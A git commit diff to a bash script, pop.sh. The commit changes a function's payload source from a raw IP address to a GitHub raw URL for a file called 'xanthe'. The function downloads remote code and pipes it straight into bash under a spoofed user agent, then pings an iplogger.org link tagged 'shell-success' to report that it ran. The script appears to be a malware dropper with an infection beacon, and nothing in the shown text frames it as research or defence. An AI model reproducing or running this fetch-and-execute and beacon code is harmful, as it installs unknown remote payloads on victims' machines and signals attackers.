6ecf28e25b328ae4336d4dc72432aa6931a9f38d
Nanda_Kumar <42697805+nandakrr@users.noreply.github.com>
2022-02-02 15:27:20 +0530

    Update pop.sh

--- pop.sh
+++ pop.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 successgo(){
-curl -A goteeeem/1.4 -sL http://34.92.166.158:8080/files/xanthe | bash -s
+curl -A goteeeem/1.4 -sL https://raw.githubusercontent.com/nandakrr/xanthe/main/xanthe | bash -s
 curl -A shell-success/1.4 -sLo /dev/null https://iplogger.org/17Cph7
 date +"%r";
 }
